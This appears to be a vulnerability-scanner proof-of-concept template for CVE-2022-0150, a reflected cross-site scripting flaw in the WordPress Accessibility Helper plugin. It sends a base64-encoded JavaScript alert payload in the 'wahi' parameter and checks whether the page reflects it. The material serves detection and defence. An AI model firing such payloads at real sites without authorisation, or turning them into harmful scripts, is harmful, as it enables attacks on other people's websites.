name: yaml-poc-wp_accessibility_helper_project-wp_accessibility_helper-xss-CVE-2022-0150
binding: 5004dd78-d339-4a41-9085-82a161dfa94c
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-0150/
        - https://nvd.nist.gov/vuln/detail/CVE-2022-0150
        - https://plugins.trac.wordpress.org/changeset/2661008
        - https://wpscan.com/vulnerability/7142a538-7c3d-4dd0-bd2c-cbd2efaf53c5
    vulnerability:
        id: b4e89a23-d3d4-4bcd-b6d4-ad3128ff4b10
        level: medium
    warning: Harmless
transport: http
set:
    rand: randomInt(100000, 200000)
    payload: base64("';alert(" + string(rand) + ");//")
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /?wahi={{payload}}
        expression: response.status == 200 && response.body.bcontains(bytes("';alert(" + string(rand) + ");//"))
expression: r0()
